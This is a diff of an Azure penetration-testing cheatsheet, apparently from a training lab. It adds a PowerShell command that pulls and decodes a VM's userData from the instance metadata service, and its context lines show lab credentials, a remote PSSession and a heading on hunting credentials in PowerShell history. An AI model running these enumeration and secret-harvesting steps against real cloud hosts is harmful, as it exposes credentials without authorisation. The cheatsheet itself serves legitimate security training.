@@ -66,6 +66,7 @@ Get-AzADGroupMember -GroupDisplayName '<VM Admins>' | select DisplayName
   - [RunCommand](https://github.com/conma293/Azure/blob/main/cheatsheet.md#runcommand)
   - [Connect to VM](https://github.com/conma293/Azure/blob/main/cheatsheet.md#connect-to-vm)
     - [Get Public IP](https://github.com/conma293/Azure/blob/main/cheatsheet.md#get-public-ip)
+  - [IMDS Enum VM]()
 - Interesting File Locations
   - [Powershell History]
   - 
@@ -398,6 +399,14 @@ $creds = New-Object System.Management.Automation.PSCredential('student213', $Pas
 $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
 Enter-PSSession $sess
 ```
+
+### IMDS
+#### VM UserData:
+```
+$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+```
+
 
 ## Interesting File Locations
 #### Powershell history - credentials
